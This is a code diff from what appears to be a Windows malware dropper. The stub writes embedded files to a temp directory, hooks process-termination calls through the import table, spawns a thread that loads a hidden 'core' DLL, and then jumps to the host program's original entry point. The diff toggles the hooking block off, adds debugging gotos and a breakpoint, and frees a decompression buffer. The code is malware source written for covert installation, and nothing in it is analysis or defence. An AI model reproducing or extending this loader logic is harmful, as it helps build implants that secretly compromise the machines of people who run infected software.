@@ -343,6 +343,8 @@ NEXT_ENTRY:
 	// GOTO OEP_CALL FROM NOW ON ONLY!!!
 	//
 	
+	//goto OEP_CALL;
+	
 	//
 	// *** verify essential calls (optional calls should be verified before each use) ***
 	//
@@ -455,7 +457,7 @@ NEXT_ENTRY:
 	
 	// directory created or already present, so jump into it
 	pfn_SetCurrentDirectory(lpTmpDir);
-
+	
 	// add core.dll to path, will be used to call HFF8 later
 	_STRCAT_(lpTmpDir, (char *) (((char*)header) + header->files.names.core.offset));
 	header->dllPath = lpTmpDir;
@@ -541,6 +543,7 @@ NEXT_ENTRY:
 			goto OEP_CALL;
 	}
 	
+#if 0
 	//
 	// Install syscall hooks
 	//
@@ -549,6 +552,8 @@ NEXT_ENTRY:
 	TERMINATEPROCESS pfn_TerminateProcessHook = (TERMINATEPROCESS)( ((char*)header) + header->functions.terminateProcessHook.offset);
 	EXIT pfn_ExitHook = (EXIT) ( ((char*)header) + header->functions.exitHook.offset);
 	
+	//goto CORE_THREAD;
+
 	// we can proceed even if hooking is not successful
 	UINT_PTR IAT_rva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
 	if (pfn_HookCall && IAT_rva) {
@@ -579,15 +584,19 @@ NEXT_ENTRY:
 				MESSAGE(STRING(STRIDX_EXITHOOKED));
 		}
 	}
+#endif
+
+	// goto OEP_CALL;
 	
 	//
 	// Spawn thread to run core dll
 	//
 	
+	//__asm int 3;
 	THREADPROC pfn_CoreThreadProc = (THREADPROC)(((char*)header) + header->functions.coreThread.offset); 
-	if (pfn_CoreThreadProc)
+	if (pfn_CoreThreadProc) {
 		pfn_CreateThread(NULL, 0, pfn_CoreThreadProc, header, 0, NULL);
-	else {
+	} else {
 		// XXX installation of core failed, we should remove any traces of intallation
 		goto OEP_CALL;
 	}
@@ -656,7 +665,7 @@ BOOL WINAPI DumpFile(CHAR * fileName, CHAR* fileData, DWORD dataSize, DWORD orig
 	
 	// create or open the file for overwriting
 	MESSAGE(fileName);
-	
+		
 	// restore normal attributes if the file already exists
 	pfn_SetFileAttributes(fileName, FILE_ATTRIBUTE_NORMAL);
 	
@@ -681,6 +690,10 @@ BOOL WINAPI DumpFile(CHAR * fileName, CHAR* fileData, DWORD dataSize, DWORD orig
 	// close it
 	pfn_CloseHandle(hFile);
 	
+#if defined PACK_DATA
+	pfn_VirtualFree(uncompressed, 0, MEM_RELEASE);
+#endif
+
 	return TRUE;
 }
 FUNCTION_END(DumpFile);
@@ -711,7 +724,7 @@ DWORD WINAPI CoreThreadProc(__in  LPVOID lpParameter)
 	_STRCAT_( complete_path, STRING(STRIDX_COMMAHFF8));
 	
 	MESSAGE(complete_path);
-		
+	
 	HMODULE hLib = pfn_LoadLibrary(header->dllPath);
 	if (hLib == INVALID_HANDLE_VALUE)
 		goto THREAD_EXIT;
